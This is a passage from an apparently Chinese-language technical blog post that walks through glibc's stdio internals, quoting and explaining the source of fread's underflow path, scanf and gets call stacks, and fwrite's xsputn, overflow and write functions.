class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_file_underflow</code>函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，</p><p>其中<code>fp-&gt;_IO_read_ptr</code>指向输入缓冲区数据的开始位置，<code>fp-&gt;_IO_read_end</code>指向输入缓冲区数据结束的位置：</p><p>函数执行完后，返回到<code>_IO_file_xsgetn</code>函数中，由于<code>while</code>循环的存在，重新执行第二部分，此时将输入缓冲区拷贝至目标缓冲区，最终返回。</p><p>至此，对于fread的源码分析结束。</p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>如果分配buf时出错,则执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>采用不使用缓冲区的方式读取</strong></p><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">_IO_new_file_underflow at fileops.c</span><br><span class="line">__GI__IO_default_uflow at genops.c</span><br><span class="line">_IO_vfscanf_internal at vfscanf.c</span><br><span class="line">__isoc99_scanf at  at isoc99_scanf.c</span><br></pre></td></tr></table></figure><p>栈回溯</p><p>可以看到scanf最终是<strong>调用stdin的vtable中的<code>_IO_new_file_underflow</code>去调用read</strong>的。</p><p>不过它并不是由<code>_IO_file_xsgetn</code>调用的，而是使用vtable中的<code>__uflow</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><p><code>__uflow</code>函数首先直接调用_IO_new_file_underflow,因此最终也是<code>_IO_new_file_underflow</code>实现的输入。之后其只返回_IO_read_ptr处的一个字符</p><h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">gets</span><br></pre></td></tr></table></figure><p>函数调用栈与scanf基本一致：</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>虽然不能说全部的io输入都是通过<code>_IO_new_file_underflow</code>函数最终实现的输入，但是应该也可以说大部分是使用<code>_IO_new_file_underflow</code>函数实现的。</p><p>但是仍然有一个问题，由于<code>__uflow</code>直接就调用了<code>_IO_new_file_underflow</code>函数，那么输入缓冲区是在哪里建立的呢</p><p>为了找到这个问题的答案，在程序进入到fscanf函数后又在<code>malloc</code>函数下了个断点，然后栈回溯：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span></span><br><span class="line">__GI__IO_file_doallocate</span><br><span class="line">__GI__IO_doallocbuf</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">__GI__IO_vfscanf</span><br><span class="line">__isoc99_fscanf</span><br><span class="line">main</span><br><span class="line">__libc_start_main</span><br></pre></td></tr></table></figure><p>原来是在<code>__GI__IO_file_underflow</code>分配的空间，回到上面看该函数的源码，确实有一段判断输入缓冲区如果为空则调用<code>__GI__IO_doallocbuf</code>函数建立输入缓冲区的代码，这就解释了<code>__GI__IO_file_underflow</code>第二步中为啥还会有个输入缓冲区判断的原因了。</p><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><p>有点复杂,写的乱了点,之后改</p><p>fwrite实际上是_IO_fwrite,位于libio/iofwrite.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>_IO_sputn是一个宏最终调用的是vtable中的_IO_file_xsputn,直接搜是找不到这个函数的定义,因为其实际上已被_IO_new_file_xsputn替代</p><p>_IO_new_file_xsputn位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到整体逻辑与fread几乎是一致的</p><h2 id="0x1-2"><a href="#0x1-2" class="headerlink" title="0x1"></a>0x1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">   count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br></pre></td></tr></table></figure><p>如果文件流属于行缓冲模式</p><p>则倒序搜索数据串中是否存在’\n’</p><p>存在则设置count和must_flush标志</p><p>如果不处于行缓冲模式则根据缓冲区中是否有数据设置count</p><h2 id="0x2-2"><a href="#0x2-2" class="headerlink" title="0x2"></a>0x2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果count&gt;0就先将已有的部分传递给文件流</p><h2 id="0x3-2"><a href="#0x3-2" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"><span class="comment">//清空缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 todo 还有剩余（即剩余空间不够）或 must_flush 被置为 1 的情况（即上面有 flush 的情况），需要做如下的处理：</p><ul><li>先调用_IO_OVERFLOW 将前面写满的 buffer 写入物理文件中，如果此时写入失败的话，那就需要做处理，如果 to_do == 0，即本次要写入的东西都写到缓冲 buffer 里面了，所以是写入失败的，需要返回 EOF，否则，说明 n - todo 字节的 buffer 被写入缓冲了。</li><li>计算当前文件流对象的 buffer 大小 block_size(即_IO_buf_end-_IO_buf_base)，如果 block_size 大于 128，则计算剩余未写入字节的余数 to_do % block_size，否则置为 0，计算 do_write 为剩余字节数减去上面计算处出的对齐余数。所以作用是将剩余的未写入字节数规整为 m*block_size + 剩余未满 block_size 字节的部分。</li><li>调用 new_do_write 写入上面计算出的一整块数据（这些数据大小是 m 个 buffer 缓冲区大小），注意，这里返回的实际写入字节数 count 如果小于我们前面计算的 do_write 大小，那就直接返回已写入的字节数 n - to_do（说明有写入失败的情况存在）。</li><li>最后，如果还有字节没有写入，那就需要调用_IO_default_xsputn 进行剩余字节的写入。</li><li>最后的返回信息仍然是 n - to_do 字节</li></ul><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>先看_IO_OVERFLOW (f, EOF) </p><p>其调用__overflow</p><p>代码位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;<span class="comment">//文件不允许写入</span></span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">  f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<span class="comment">//切换为写入模式</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">  f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其又调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_new_file_write (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">ssize_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">ssize_t</span> count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span 